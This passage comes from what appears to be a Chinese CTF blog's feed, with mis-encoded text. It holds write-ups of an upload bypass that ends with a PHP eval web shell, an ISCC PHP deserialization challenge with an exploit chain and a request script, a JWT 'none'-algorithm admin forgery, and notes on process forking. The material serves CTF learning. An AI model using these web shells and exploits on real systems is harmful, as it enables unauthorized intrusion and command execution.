htaccess.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    generate_htacess()</span><br><span class="line"></span><br><span class="line">    generate_php_file(<span class="string">&quot;shell.lethe&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="00è¿›è¡Œæˆªæ–­"><a href="#00è¿›è¡Œæˆªæ–­" class="headerlink" title="%00è¿›è¡Œæˆªæ–­"></a>%00è¿›è¡Œæˆªæ–­</h3><p>ä½¿ç”¨ç±»å‹æŠ“åˆ°åŒ…åå¯ä»¥çœ‹åˆ°uploadä¸Šä¼ è·¯å¾„æ‰å¯ä»¥</p><h3 id="apacheè§£ææ¼æ´"><a href="#apacheè§£ææ¼æ´" class="headerlink" title="apacheè§£ææ¼æ´"></a>apacheè§£ææ¼æ´</h3><p>ä¸Šä¼ 1.php.txtxttt</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>which-is-true-iscc</title>
      <link href="/2021/05/05/which-is-true-iscc/"/>
      <url>/2021/05/05/which-is-true-iscc/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>æºç </p><pre><code>&lt;?phpsession_start();ini_set(&#39;max_execution_time&#39;, &#39;5&#39;);set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload &#123;    function __wakeup() &#123;        global $cmd;        global $is_upload;        $cmd = &quot;whoami&quot;;        $_SESSION[&#39;name&#39;] = randstr(14);        $is_upload = (count($_FILES) &gt; 0);&#125;function __destruct() &#123;    global $is_upload;    global $status;    global $iscc_file;    $status = &quot;upload_fail&quot;;    if ($is_upload) &#123;        foreach ($_FILES as $key =&gt; $value)            $GLOBALS[$key] = $value;        if(is_uploaded_file($iscc_file[&#39;tmp_name&#39;])) &#123;            $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]);            if($check !== false) &#123;                $target_dir = &quot;/var/tmp/&quot;;                $target_file = $target_dir . randstr(10);                if (file_exists($target_file)) &#123;                    echo &quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;;                    finalize();                    exit;                &#125;                if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123;                    echo &quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;;                    finalize();                    exit;                &#125;                if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123;                    echo &quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;;                    $iscc_file = $target_file;                    $status = &quot;upload_ok&quot;;                &#125; else &#123;                    echo &quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;;                    finalize();                    exit;                &#125;            &#125; else &#123;                finalize();                exit;            &#125;        &#125; else &#123;            echo &quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;;            finalize();            exit;        &#125;    &#125;&#125;&#125;class ISCC_ResetCMD &#123;protected $new_cmd = &quot;echo &#39;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#39;&quot;;function __wakeup() &#123;    global $cmd;    global $is_upload;    global $status;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    if(!isset($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;;        throw new Exception($error);    &#125;    if(!is_string($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &#39;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#39;;        throw new Exception($error);    &#125;&#125;function __destruct() &#123;    global $cmd;    global $status;    $status = &quot;reset&quot;;    if($_SESSION[&#39;name&#39;] === &#39;isccIsCciScc1scc&#39;) &#123;        $cmd = $this-&gt;new_cmd;    &#125;&#125;&#125;class ISCC_Login &#123;function __wakeup() &#123;    $this-&gt;login();&#125;function __destruct() &#123;    $this-&gt;logout();&#125;function login() &#123;    $flag = file_get_contents(&quot;/flag&quot;);    $pAssM0rd = hash(&quot;sha256&quot;, $flag);    if($_GET[&#39;pAssM0rd&#39;] === $pAssM0rd)        $_SESSION[&#39;name&#39;] = &quot;isccIsCciScc1scc&quot;;&#125;function logout() &#123;    global $status;    unset($_SESSION[&#39;name&#39;]);    $status = &quot;finish&quot;;&#125;&#125;class ISCC_TellMeTruth &#123;function __wakeup() &#123;    if(!isset($_SESSION[&#39;name&#39;]))        $_SESSION[&#39;name&#39;] = randstr(14);    echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION[&#39;name&#39;].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;;&#125;function __destruct() &#123;    echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION[&#39;name&#39;].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;;&#125;&#125;class ISCC_Command &#123;function __wakeup() &#123;    global $cmd;    global $is_upload;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    $cmd = &quot;whoami&quot;;&#125;function __toString() &#123;    global $cmd;    return &quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: &#123;$cmd&#125; &lt;br&gt;&quot;;&#125;function __destruct() &#123;    global $cmd;    global $status;    global $is_unser_finished;    $status = &quot;cmd&quot;;    if($is_unser_finished === true) &#123;        echo &quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#39;color:red&#39;&gt;&#123;$cmd&#125;&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;;        echo &quot;&lt;span style=&#39;color:blue&#39;&gt;&quot;;        @system($cmd);        echo &quot;&lt;/span&gt;&quot;;    &#125;&#125;&#125;function randstr($len)&#123;$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#39;;$randstring = &#39;&#39;;for ($i = 0; $i &lt; $len; $i++) &#123;    $randstring .= $characters[rand(0, strlen($characters))];&#125;return $randstring;&#125;function waf($s) &#123;if(stripos($s, &quot;*&quot;) !== FALSE)    return false;return true;&#125;function finalize() &#123;$cmd = &quot;&quot;;$is_upload = false;unset($_SESSION);@unlink($iscc_file);$status = &quot;finish&quot;;echo &quot;&lt;img src=&#39;whichisthetrueiscc.gif&#39;&gt;&lt;br&gt;&quot;;&#125;if(isset($_GET[&#39;whatareyounongshane&#39;])) &#123;$whatareyounongshane = $_GET[&#39;whatareyounongshane&#39;];switch ($whatareyounongshane) &#123;    case &quot;src&quot;:        highlight_file(__FILE__);        break;    case &quot;cmd&quot;:        echo &quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;;        header(&#39;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#39;);        break;    case &quot;reset&quot;:        echo &quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;;        header(&#39;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#39;);        break;    case &quot;upload&quot;:        $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;  &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt;  &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF;        echo $resp;        break;    case &quot;tellmetruth&quot;:        echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;);        header(&#39;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#39;);        break;    default:        echo &quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;;&#125;finalize();die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);&#125;if(isset($_GET[&#39;?&#39;])) &#123;$wtf = waf($_GET&#123;&#39;?&#39;&#125;) ? $_GET[&#39;?&#39;] : (finalize() &amp;&amp; die(&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;));if($goodshit = @unserialize($wtf)) &#123;    $is_unser_finished = true;&#125;if(in_array($status, array(&#39;new&#39;, &#39;cmd&#39;, &#39;upload_ok&#39;, &#39;upload_fail&#39;, &#39;reset&#39;), true))    finalize();die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);&#125;?&gt;</code></pre><p>è¯´å®è¯è¿™ä¸ªæºç ä¸€ä¸‹å­éƒ½ç»™æˆ‘çœ‹å®³æ€•äº†è¿™ä¹Ÿå¤ªé•¿äº†å§ã€‚ã€‚ã€‚ã€‚</p><p>å…ˆæ‰¾åˆ°æ¼æ´åœ¨å¾—åœ°æ–¹</p><pre><code>class ISCC_Command &#123;function __wakeup() &#123;    global $cmd;    global $is_upload;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    $cmd = &quot;whoami&quot;;&#125;function __toString() &#123;    global $cmd;    return &quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: &#123;$cmd&#125; &lt;br&gt;&quot;;&#125;function __destruct() &#123;    global $cmd;    global $status;    global $is_unser_finished;//10,247    $status = &quot;cmd&quot;;    if($is_unser_finished === true) &#123;        echo &quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#39;color:red&#39;&gt;&#123;$cmd&#125;&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;;        echo &quot;&lt;span style=&#39;color:blue&#39;&gt;&quot;;        @system($cmd);        echo &quot;&lt;/span&gt;&quot;;    &#125;&#125;&#125;</code></pre><p>æˆ‘ä»¬æ˜¯æƒ³æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„flagï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åº”è¯¥æ”¹å˜cmdå¾—å€¼ï¼Œcmdæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ‰€ä»¥å°è¯•æŸ¥æ‰¾å“ªé‡Œcmdå¾—å€¼å‘ç”Ÿæ”¹å˜</p><pre><code>class ISCC_ResetCMD &#123;protected $new_cmd = &quot;echo &#39;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#39;&quot;;function __wakeup() &#123;    global $cmd;    global $is_upload;    global $status;    $_SESSION[&#39;name&#39;] = randstr(14);    $is_upload = false;    if(!isset($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;;        throw new Exception($error);       &#125;    if(!is_string($this-&gt;new_cmd)) &#123;        $status = &quot;error&quot;;        $error = &#39;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#39;;        throw new Exception($error);    &#125;&#125;function __destruct() &#123;    global $cmd;    global $status;    $status = &quot;reset&quot;;    if($_SESSION[&#39;name&#39;] === &#39;isccIsCciScc1scc&#39;) &#123;        $cmd = $this-&gt;new_cmd;    &#125;&#125;&#125;</code></pre><p>åº”è¯¥æ˜¯è¿™é‡Œå‘ç”Ÿäº†å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹å˜new_cmdæ¥æ”¹å˜cmdï¼Œä½†æ˜¯æ”¹å˜new_cmdå¾—å€¼éœ€è¦æˆ‘ä»¬ä½¿å¾—$_SESSION[â€˜nameâ€™]=isccIsCciScc1sccï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯æ€ä¹ˆæ”¹å˜$_SESSION[â€˜nameâ€™]ï¼Œå› ä¸ºåˆå§‹å¾—æ—¶å€™sessionå¾—å€¼æ˜¯14ä½éšæœºæ•°</p><pre><code>class ISCC_Login &#123;function __wakeup() &#123;    $this-&gt;login();&#125;function __destruct() &#123;    $this-&gt;logout();&#125;function login() &#123;    $flag = file_get_contents(&quot;/flag&quot;);    $pAssM0rd = hash(&quot;sha256&quot;, $flag);    if($_GET[&#39;pAssM0rd&#39;] === $pAssM0rd)        $_SESSION[&#39;name&#39;] = &quot;isccIsCciScc1scc&quot;;&#125;function logout() &#123;    global $status;    unset($_SESSION[&#39;name&#39;]);    $status = &quot;finish&quot;;&#125;&#125;</code></pre><p>è¿™é‡Œç»™äººä¸€ç§å¾ˆæ˜æ˜¾å¾—é”™è§‰ï¼Œä½†æ˜¯ï¼Œæˆ‘èƒ½å‘ç°çš„å°±æ˜¯logoutè¿™ä¸ªæ–¹æ³•ï¼Œæœ‰ä¸€ä¸ªunsetå‡½æ•°ç”¨äºé”€æ¯å˜é‡ï¼Œå¦‚æœæˆ‘ä»¬ä¸€æ—¦ä½¿ç”¨è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬å¾—è¿™ä¸ªå˜é‡å°±æ²¡æœ‰äº†ï¼Œæ‰€ä»¥ä¸€å®šä¸èƒ½è°ƒç”¨è¿™ä¸ªç±»</p><p>åšåˆ°è¿™é‡Œæˆ‘å°±å¡ä½äº†</p><p>å‚è€ƒfengå¸ˆå‚…å¾—æ–‡ç« ï¼Œè¯´æ˜¯å¯ä»¥åœ¨è¿™ä¸ªç±»ä¸­</p><p><img src="1.PNG"></p><p>ç°åœ¨å¼€å§‹æ„é€ é“¾</p><pre><code>&lt;?phpclass ISCC_Command &#123;&#125;class ISCC_ResetCMD &#123;    protected $new_cmd = &quot;cat /flag&quot;;&#125;class ISCC_Upload &#123;&#125;$a=array(    &#39;a&#39;=&gt;new ISCC_Upload(),    &#39;b&#39;=&gt;new ISCC_ResetCMD(),    &#39;c&#39;=&gt;new ISCC_Command(),);$b=urlencode(serialize($a));$b=str_replace(&quot;s&quot;,&quot;S&quot;,$b);$b=str_replace(&quot;%2A&quot;,&#39;\2a&#39;,$b);echo $b;</code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯$_FILESçš„å¤„ç†äº†ã€‚</p><pre><code>import requestsurl=&quot;http://39.96.91.106:7050/&quot;files=&#123;    &#39;iscc_file&#39;:(&quot;b&quot;,open(&quot;1.jpg&quot;,&quot;rb&quot;)),    &quot;_SESSION&quot;:(&quot;isccIsCciScc1scc&quot;,&quot;123&quot;)&#125;headers=&#123;    &#39;Cookie&#39;:&quot;XDEBUG_SESSION=PHPSTORM&quot;&#125;r=requests.post(url=url+&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;,files=files,headers=headers)print(r.text)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å‘¨è®°1</title>
      <link href="/2021/05/05/%E5%91%A8%E8%AE%B01/"/>
      <url>/2021/05/05/%E5%91%A8%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>å¼€å§‹å­¦ç€å»è®°å½•ä¸€ä¸ªæ¯ä¸€å‘¨å­¦ä¹ äº†ä»€ä¹ˆè¿›æ­¥äº†å¤šå°‘ã€‚</p><p>è¯´å®è¯ï¼Œå­¦ä¹ ctfåˆ°ç°åœ¨ï¼Œæˆ‘è¿˜æ˜¯æ„Ÿè§‰è‡ªå·±å¾ˆèœï¼Œé©¬ä¸Šå°±æœŸæœ«äº†ï¼ŒæŒºå¿«çš„ä¸‹ä¸€å±Šçš„å­¦å¼Ÿå­¦å¦¹éƒ½æ¥äº†ï¼Œå¯æ˜¯æˆ‘è¿˜æ˜¯è¿™ä¹ˆçš„èœã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>å­¦ä¹ jwt</p><p>ä½†æ˜¯ä¸å¤Ÿæ·±å…¥ï¼Œéœ€è¦æ·±å…¥å­¦ä¹ </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easylogin</title>
      <link href="/2021/05/05/easylogin/"/>
      <url>/2021/05/05/easylogin/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>è¿™é“é¢˜å®Œå…¨æ˜¯çŸ¥è¯†ç›²åŒº</p><span id="more"></span><p>æ‰“å¼€é¢˜ç›®åæŸ¥çœ‹static/js/app.js</p><pre><code>function login() &#123;    const username = $(&quot;#username&quot;).val();//æ‰€èµ‹çš„å€¼å¿…éœ€åˆå§‹åŒ–å¹¶ä¸”ä¸å¯ä»¥æ”¹å˜    const password = $(&quot;#password&quot;).val();//$(&quot;#username&quot;)ä¸ºidé€‰æ‹©å™¨ï¼Œè·å¾—ä¸€ä¸ªidä¸ºpasswordçš„æ ‡ç­¾ï¼Œç„¶åé€šè¿‡valï¼ˆï¼‰è·å¾—è¯¥æ ‡ç­¾çš„å€¼    const token = sessionStorage.getItem(&quot;token&quot;);//è¿”å›tokenæ‰€å¯¹çš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™è¿”å›null    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)//é‡‡ç”¨postæ–¹æ³•ï¼Œå‰é¢æ˜¯urlåé¢æ˜¯å‚æ•°    .done(function(data) &#123;//å¦‚æœæˆåŠŸäº†å°±å®šä½åˆ°/homeï¼ˆå¾—åˆ°flagçš„é‚£ä¸ªé¡µé¢ï¼‰ï¼Œå¦‚æœå¤±è´¥äº†å°±è¿”å›é”™è¯¯ä¿¡æ¯        const &#123;status&#125; = data;//ç›¸å½“äº const status=data.status        if(status) &#123;            document.location = &quot;/home&quot;;        &#125;    &#125;)    .fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;function register() &#123;    const username = $(&quot;#username&quot;).val();    const password = $(&quot;#password&quot;).val();    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)        .done(function(data) &#123;            const &#123; token &#125; = data;            sessionStorage.setItem(&#39;token&#39;, token);//ä¿å­˜æ•°æ®ï¼Œåç§°æ˜¯tokenï¼Œå€¼æ˜¯token            document.location = &quot;/login&quot;;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function logout() &#123;    $.get(&#39;/api/logout&#39;).done(function(data) &#123;        const &#123;status&#125; = data;        if(status) &#123;            document.location = &#39;/login&#39;;        &#125;    &#125;);&#125;function getflag() &#123;    $.get(&#39;/api/flag&#39;).done(function(data) &#123;        const &#123;flag&#125; = data;        $(&quot;#username&quot;).val(flag);    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>è¿™æ®µä»£ç åªèƒ½è¯»å‡ºæ¥æœ‰ä¸€ä¸ªåœ¨æ³¨å†Œçš„æ—¶å€™ç”Ÿæˆäº†token</p><p>çœ‹wpï¼Œè¯´æ‰“å¼€ç½‘é¡µåå¯ä»¥å‘ç°loginå’Œregisterç­‰æ²¡æœ‰phpåç¼€ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯jsæ¡†æ¶ã€‚</p><p>æœ‰æç¤ºè¯´æ˜¯</p><blockquote><p>ã€/**</p></blockquote><ul><li> æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</li><li></li><li> è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</li><li></li><li>/</li></ul><p>æç¤ºæœ‰ï¼šä½¿ç”¨çš„æ˜¯koaæ¡†æ¶ï¼Œç„¶åé™æ€æ–‡ä»¶å¤„ç†å‡ºç°é—®é¢˜ï¼Œå¾ˆå¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p><p>koaæ¡†æ¶</p><p><img src="1.png"></p><p>å…¶ä¸­controllersç›®å½•æ˜¯é¡¹ç›®æ§åˆ¶å™¨å­˜æ”¾ç›®å½•ï¼šæ¥æ”¶è¯·æ±‚ï¼Œå¤„ç†é€»è¾‘</p><p>å°è¯•è®¿é—®controllers/api.jsä¸controllers/view.js,api.jsæ˜¯å¤„ç†é€»è¾‘çš„è¯·æ±‚</p><pre><code>const crypto = require(&#39;crypto&#39;);const fs = require(&#39;fs&#39;)const jwt = require(&#39;jsonwebtoken&#39;)const APIError = require(&#39;../rest&#39;).APIError;module.exports = &#123;&#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;    const &#123;username, password&#125; = ctx.request.body;    if(!username || username === &#39;admin&#39;)&#123;        throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);    &#125;    if(global.secrets.length &gt; 100000) &#123;        global.secrets = [];    &#125;    const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);    const secretid = global.secrets.length;    global.secrets.push(secret)    const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);    ctx.rest(&#123;        token: token    &#125;);    await next();&#125;,&#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;    const &#123;username, password&#125; = ctx.request.body;    if(!username || !password) &#123;        throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);    &#125;    const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;    const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;    console.log(sid)    if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;        throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);    &#125;    const secret = global.secrets[sid];    const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);    const status = username === user.username &amp;&amp; password === user.password;    if(status) &#123;        ctx.session.username = username;    &#125;    ctx.rest(&#123;        status    &#125;);    await next();&#125;,&#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;    if(ctx.session.username !== &#39;admin&#39;)&#123;        throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);    &#125;    const flag = fs.readFileSync(&#39;/flag&#39;).toString();    ctx.rest(&#123;        flag    &#125;);    await next();&#125;,&#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;    ctx.session.username = null;    ctx.rest(&#123;        status: true    &#125;)    await next();&#125;&#125;;</code></pre><p>å…³é”®ï¼šconst token = jwt.sign({secretid, username, password}, secret, {algorithm: â€˜HS256â€™});</p><p>ç­¾åæ˜¯ç”±jwtè¿›è¡Œçš„</p><p>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTYyMDE4ODIwMX0</p><p>jwtç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p><p>1.headerï¼šä¸»è¦å£°æ˜äº†JWTçš„ç­¾åç®—æ³•ï¼›</p><p>2.payloadï¼šä¸»è¦æ‰¿è½½äº†å„ç§å£°æ˜å¹¶ä¼ é€’æ˜æ–‡æ•°æ®ï¼›</p><p>3.signtureï¼šæ‹¥æœ‰è¯¥éƒ¨åˆ†çš„JWTè¢«ç§°ä¸ºJWSï¼Œä¹Ÿå°±æ˜¯ç­¾äº†åçš„JWSï¼›æ²¡æœ‰è¯¥éƒ¨åˆ†çš„JWTè¢«ç§°ä¸ºnonsecure JWT ä¹Ÿå°±æ˜¯ä¸å®‰å…¨çš„JWTï¼Œæ­¤æ—¶headerä¸­å£°æ˜çš„ç­¾åç®—æ³•ä¸ºnoneã€‚</p><p>ä¸‰ä¸ªéƒ¨åˆ†ç”¨Â·åˆ†å‰²ã€‚å½¢å¦‚ xxxxx.yyyyy.zzzzzçš„æ ·å¼ã€‚</p><p><a href="https://www.freebuf.com/articles/web/181261.html">jwt</a></p><p><img src="2.PNG"></p><p>éšä¾¿ç™»å½•æ³¨å†Œå¾—åˆ°ä¸€ä¸ªjwt</p><p><img src="3.PNG"></p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p>ç„¶åè¿ç”¨è„šæœ¬</p><pre><code>import jwttoken = jwt.encode(&#123;  &quot;secretid&quot;: [],  &quot;username&quot;: &quot;admin&quot;,  &quot;password&quot;: &quot;123456&quot;,  &quot;iat&quot;: 1620188201&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;)print(token)</code></pre><p>ç„¶åç”¨è¿™ä¸ªè¿›è¡Œç™»å½•ï¼Œè·å–flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pcntl_fork</title>
      <link href="/2021/05/04/pcntl-fork/"/>
      <url>/2021/05/04/pcntl-fork/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php  </span><br><span class="line">$pid &#x3D; pcntl_fork();</span><br><span class="line">if ($pid &#x3D;&#x3D; -1)</span><br><span class="line">&#123;</span><br><span class="line">   die(&quot;could not fork&quot;);</span><br><span class="line">&#125;</span><br><span class="line">elseif($pid &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">   echo &quot;I&#39;m the child  process \n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">   echo &quot;I&#39;m the parent process \n&quot;;</span><br><span class="line">   exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦ææ¸…æ¥šforkçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå°±å¿…é¡»å¼„æ¸…æ¥šæ“ä½œç³»ç»Ÿä¸­â€œè¿›ç¨‹processâ€æ¦‚å¿µ</p><p>ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸»è¦åŒ…æ‹¬ä¸‰ä¸ªå…ƒç´ ï¼š</p><p>1.ä¸€ä¸ªå¯ä»¥æ‰§è¡Œçš„ç¨‹åº</p><p>2.å’Œè¯¥è¿›ç¨‹ç›¸å…³è”çš„å…¨éƒ¨æ•°æ®ï¼ˆåŒ…æ‹¬å˜é‡ï¼Œå†…å­˜ç©ºé—´ï¼Œç¼“å†²åŒºç­‰ç­‰ï¼‰</p><p>3.ç¨‹åºå¾—æ‰§è¡Œä¸Šä¸‹æ–‡</p><p>ä¸å¦¨ç®€å•å¾—ç†è§£ä¸ºä¸€ä¸ªè¿›ç¨‹è¡¨ç¤ºçš„å°±æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºå¾—ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹çš„ä¸€ä¸ªçŠ¶æ€ï¼Œæ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹å¾—ç®¡ç†ï¼Œå…¸å‹çš„æƒ…å†µå°±æ˜¯é€šè¿‡è¿›ç¨‹è¡¨å®Œæˆçš„ã€‚è¿›ç¨‹è¡¨å¾—æ¯ä¸€ä¸ªè¡¨é¡¹ï¼Œè®°å½•çš„æ˜¯å½“å‰æ“ä½œç³»ç»Ÿä¸­ä¸€ä¸ªè¿›ç¨‹å¾—æƒ…å†µã€‚</p><p>â€œç¨‹åºè®¡æ•°å™¨â€å¾—å¯„å­˜å™¨ï¼ŒæŒ‡å‡ºå½“å‰å ç”¨cpuè¿›ç¨‹è¦æ‰§è¡Œå¾—ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®</p><p>å½“åˆ†ç»™æŸä¸ªè¿›ç¨‹å¾—cpuæ—¶é—´å·²ç»ç”¨å®Œäº†ï¼Œæ“ä½œç³»ç»Ÿå°†è¯¥è¿›ç¨‹ç›¸å…³å¾—å¯„å­˜å™¨å¾—å€¼ï¼Œä¿å­˜åœ¨è¯¥è¿›ç¨‹åœ¨è¿›ç¨‹è¡¨å¯¹å°çš„è¡¨é¡¹é‡Œï¼ŒæŠŠè¦æ¥æ›¿è¿™ä¸ªè¿›ç¨‹cpuå¾—é‚£ä¸ªè¿›ç¨‹ä»è¿›ç¨‹è¡¨é‡Œè¯»å‡ºï¼Œå¹¶æ›´æ–°åˆ°ç›¸åº”çš„å¯„å­˜å™¨ã€‚ä¸»è¦è¦è®°ä½ç¨‹åºå¯„å­˜å™¨pcæŒ‡å‡ºç¨‹åºå½“å‰å·²ç»æ‰§è¡Œåˆ°å“ªé‡Œï¼Œæ˜¯è¿›ç¨‹ä¸Š ä¸‹æ–‡çš„é‡è¦å†…å®¹ï¼Œæ¢å‡º CPUçš„è¿›ç¨‹è¦ä¿å­˜è¿™ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œæ¢å…¥CPUçš„è¿›ç¨‹ï¼Œä¹Ÿè¦æ 